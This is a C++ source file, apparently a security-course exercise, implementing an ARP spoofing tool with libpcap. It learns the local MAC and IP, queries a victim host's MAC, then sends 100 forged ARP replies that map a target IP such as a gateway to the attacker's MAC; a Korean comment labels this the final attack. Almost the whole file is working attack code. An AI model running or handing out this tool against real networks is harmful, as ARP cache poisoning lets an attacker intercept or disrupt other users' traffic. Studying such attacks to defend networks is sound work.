#include <cstdio>
#include <stdio.h>
#include <ifaddrs.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"

void get_mydevice(char *dev, Mac *mymac, Ip *myip);
void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
Mac get_sender_mac(pcap_t *handle, Ip sender_ip);

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

EthArpPacket packet;

void usage()
{
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    //edit
    Mac mymac, sender_mac, target_mac;
    Ip myIP, sender_IP, target_IP;
    Mac broad = Mac::broadcastMac();
    Mac unknown = Mac::nullMac();
    sender_IP = Ip(std::string(argv[2]));
    target_IP = Ip(std::string(argv[3]));

    //내 맥, 아이피 알아내기
    get_mydevice(dev, &mymac, &myIP);
    printf("My Mac: %s\n", std::string(mymac).data());
    printf("My IP : %s\n", std::string(myIP).data());

    //상대 ip주소 활용해서 arp 보내기
    send_arp_packet(broad, mymac, 1, mymac, myIP, unknown, sender_IP, handle);

    //패킷 받아서 센더의 맥어드레스 알아내기
    sender_mac = get_sender_mac(handle, sender_IP);
    printf("Sender Mac: %s\n", std::string(sender_mac).data());

    //알아낸 정보들로 최종 공격하기
     for(int i = 0; i<100; i++)
   {
      send_arp_packet(sender_mac, mymac, 2, mymac, target_IP, sender_mac, sender_IP, handle);
   }
    //edit

    pcap_close(handle);
}

void get_mydevice(char *dev, Mac *mymac, Ip *myip)
{
    int fd;
    struct ifreq ifr;
    const char *iface = dev;
    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr))
    {
        *mymac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
    }

    if (0 == ioctl(fd, SIOCGIFADDR, &ifr))
    {
        *myip = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
    }
    close(fd);
    return;
}

void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle)
{

    packet.eth_.dmac_ = packet_eth_dmac;
    packet.eth_.smac_ = packet_eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if (arphdr_option == 1)
    {
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if (arphdr_option == 2)
    {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    else
        return;

    packet.arp_.smac_ = packet_arp_smac; //22:22:22:22
    packet.arp_.sip_ = htonl(packet_arp_sip);
    packet.arp_.tmac_ = packet_arp_tmac;
    packet.arp_.tip_ = htonl(packet_arp_tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

Mac get_sender_mac(pcap_t* handle, Ip sender_IP)
{
   while(1)
   {
      struct pcap_pkthdr *header;
      const u_char *arp_reply_packet;
      int res = pcap_next_ex(handle, &header, &arp_reply_packet);
      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
      {
         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
         return 0;
      }
      EthArpPacket *sender_packet;
      sender_packet = (EthArpPacket *)arp_reply_packet;
      if (sender_packet->arp_.sip() == sender_IP )
      {
         printf("Get sender mac!!\n");
         return sender_packet->arp_.smac_;
      }
      else
      {
         printf("찾는중.... %s \n", std::string(sender_packet->arp_.sip_).data());
         continue;
      }
   }
}